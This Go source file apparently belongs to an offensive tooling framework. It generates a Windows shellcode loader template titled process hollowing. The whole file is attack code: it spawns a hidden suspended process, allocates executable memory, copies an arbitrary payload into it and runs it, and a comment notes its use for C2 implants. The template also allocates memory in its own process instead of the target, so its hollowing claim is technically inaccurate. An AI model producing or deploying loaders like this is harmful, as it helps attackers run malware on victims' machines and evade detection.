package loaders

import (
	"fmt"
)

/*
   For more information, feel free to read this:
   https://www.blackhat.com/docs/asia-17/materials/asia-17-KA-What-Malware-Authors-Don't-Want-You-To-Know-Evasive-Hollow-Process-Injection-wp.pdf
*/

func GetProcessHollowingTemplate(targetProcess string) string {
	return fmt.Sprintf(`
    package main

import (
	"os"
    "fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40

    CREATE_SUSPENDED = 0x00000004
    DETACHED_PROCESS = 0x00000008
    CREATE_NO_WINDOW = 0x08000000
)

var (
	kernel32 = syscall.MustLoadDLL("kernel32.dll")
	ntdll    = syscall.MustLoadDLL("ntdll.dll")

	virtualAlloc = kernel32.MustFindProc("VirtualAlloc")
	rtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
	createThread  = kernel32.MustFindProc("CreateThread")
    createProcess = kernel32.MustFindProc("CreateProcess")
    resumeThread = kernel32.MustFindProc("ResumeThread")
)

func loadProcess(target string) *syscall.ProcessInformation {
    var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	commandLine, err := syscall.UTF16PtrFromString(target)

	if err != nil {
		panic(err)
	}

    err = syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi)

    // defer syscall.CloseHandle(pi.Thread)
	// defer syscall.CloseHandle(pi.Process)

	if err != nil {
		panic(err)
	}

    fmt.Println("[+] Created process in suspended state")

	return &pi
}

func ExecuteOrderSixtySix(payload []byte) {

	// Create the process
    process := loadProcess("%s")

   	// Allocate memory for the payload in the target process
	payloadAddr, _, _ := virtualAlloc.Call(
		0, uintptr(len(payload)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	); if payloadAddr == 0 {
        os.Exit(1)
	}

    fmt.Printf("[+] Payload addr: %%#lx \n", payloadAddr)

	// Copy the payload to the target process
	_, _, _ = rtlCopyMemory.Call(
		payloadAddr, (uintptr)(unsafe.Pointer(&payload[0])), uintptr(len(payload)),
	)

    fmt.Println("[+] rtlCopyMemory done")

	// Create a remote thread to execute the payload
	var threadID uint32
	threadHandle, _, _ := createThread.Call(
		0, 0, payloadAddr, 0, 0, uintptr(unsafe.Pointer(&threadID)),
	); if threadHandle == 0 {
        os.Exit(1)
	}
	defer syscall.CloseHandle(syscall.Handle(threadHandle))
    fmt.Println("[+] createThread done")

	// Resume the suspended main thread to allow the payload to execute
	resumeThread.Call(uintptr(process.Thread))
    fmt.Println("[+] resumeThread done")

    /* block, so that process does not die (useful for C2 implants) */
    select {}
}
    `, targetProcess)
}
